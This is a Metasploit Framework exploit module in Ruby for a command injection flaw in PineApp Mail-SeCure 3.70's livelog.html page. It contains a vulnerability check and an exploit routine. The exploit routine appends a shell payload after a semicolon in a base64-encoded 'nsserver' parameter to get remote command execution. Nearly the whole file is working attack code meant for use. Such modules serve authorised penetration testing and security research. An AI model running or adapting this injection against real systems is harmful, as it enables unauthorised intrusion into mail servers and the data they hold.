# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require &#039;msf/core&#039;

class Metasploit3 < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(update_info(info,
      &#039;Name&#039;           => &#039;PineApp Mail-SeCure livelog.html Arbitrary Command Execution&#039;,
      &#039;Description&#039;    => %q{
          This module exploits a command injection vulnerability on PineApp Mail-SeCure
        3.70. The vulnerability exists on the livelog.html component, due to the insecure
        usage of the shell_exec() php function. This module has been tested successfully
        on PineApp Mail-SeCure 3.70.
      },
      &#039;Author&#039;         =>
        [
          &#039;Unknown&#039;,     # Vulnerability discovery
          &#039;juan vazquez&#039; # Metasploit module
        ],
      &#039;License&#039;        => MSF_LICENSE,
      &#039;References&#039;     =>
        [
          [ &#039;URL&#039;, &#039;http://www.zerodayinitiative.com/advisories/ZDI-13-184/&#039;]
        ],
      &#039;Platform&#039;       => [&#039;unix&#039;],
      &#039;Arch&#039;           => ARCH_CMD,
      &#039;Privileged&#039;     => false,
      &#039;Payload&#039;        =>
        {
          &#039;Space&#039;       => 1024,
          &#039;DisableNops&#039; => true,
          &#039;Compat&#039;      =>
            {
              &#039;PayloadType&#039; => &#039;cmd&#039;,
              &#039;RequiredCmd&#039; => &#039;generic perl python telnet&#039;
            }
        },
      &#039;Targets&#039;        =>
        [
          [ &#039;PineApp Mail-SeCure 3.70&#039;, { }]
        ],
      &#039;DefaultOptions&#039; =>
        {
          &#039;SSL&#039; => true
        },
      &#039;DefaultTarget&#039;  => 0,
      &#039;DisclosureDate&#039; => &#039;Jul 26 2013&#039;
      ))

    register_options(
      [
        Opt::RPORT(7443)
      ],
      self.class
    )

  end

  def my_uri
    return normalize_uri("/livelog.html")
  end

  def check
    res = send_request_cgi({
      &#039;uri&#039; => my_uri,
      &#039;vars_get&#039; => {
        &#039;cmd&#039; =>&#039;nslookup&#039;,
        &#039;nstype&#039; => Rex::Text.encode_base64("A"),
        &#039;hostip&#039; => Rex::Text.encode_base64("127.0.0.1"), # Using 127.0.0.1 in order to accelerate things with the legit command
        &#039;nsserver&#039; => Rex::Text.encode_base64("127.0.0.1")
      }
    })
    if res and res.code == 200 and res.body =~ /NS Query result for 127.0.0.1/
      return Exploit::CheckCode::Appears
    end
    return Exploit::CheckCode::Safe
  end

  def exploit
    print_status("#{rhost}:#{rport} - Executing payload...")
    send_request_cgi({
      &#039;uri&#039; => my_uri,
      &#039;vars_get&#039; => {
        &#039;cmd&#039; =>&#039;nslookup&#039;,
        &#039;nstype&#039; => Rex::Text.encode_base64("A"),
        &#039;hostip&#039; => Rex::Text.encode_base64("127.0.0.1"), # Using 127.0.0.1 in order to accelerate things with the legit command
        &#039;nsserver&#039; => Rex::Text.encode_base64("127.0.0.1;#{payload.encoded}")
      }
    })
  end

end

